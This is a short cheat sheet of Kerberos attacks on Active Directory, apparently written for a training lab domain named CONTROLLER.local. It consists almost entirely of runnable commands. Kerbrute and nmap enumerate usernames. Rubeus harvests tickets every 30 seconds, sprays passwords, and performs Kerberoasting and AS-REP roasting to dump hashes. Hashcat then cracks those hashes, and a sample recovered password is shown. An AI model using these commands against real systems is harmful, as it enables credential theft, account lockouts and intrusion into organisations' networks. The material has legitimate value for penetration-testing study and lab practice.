
### Enumerate usernames with kerbrute
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local ad-usernames.txt -v

Enumerate with nmap
└─$ nmap -p 88 -script-args krb5-enum-users.realm=’10.11.70.89’,userdb=ad-usernames.txt ...DC IP...

### Rubeus
<i>Attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting. brute force passwords as well as password spray user accounts</i>

///<b> Harvest tickets every 30 sec </b>
.\Rubeus harvest /interval:30
### Add host to windows hosts file 
echo 10.10.10.10 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
### Password spray with Rubeus
<i>Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.</i>

Rubeus.exe brute /password:Password1 /noticket

### Kerberoast with Rubeus
<i> Will automatically dump Kerberos hash of any kerberoastable users </i>

Rubeus.exe kerberoast

## ASREP Roast with Rubeus
<i>This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.</i>

Rubeus.exe asreproast

### Crack the kerberos hash with Hashcat
hashcat -m 13100 -a 0 HASH.txt rockyou.txt

output:
...snipped.....fd67337290d589b1436f6b56:MYPassword123#




















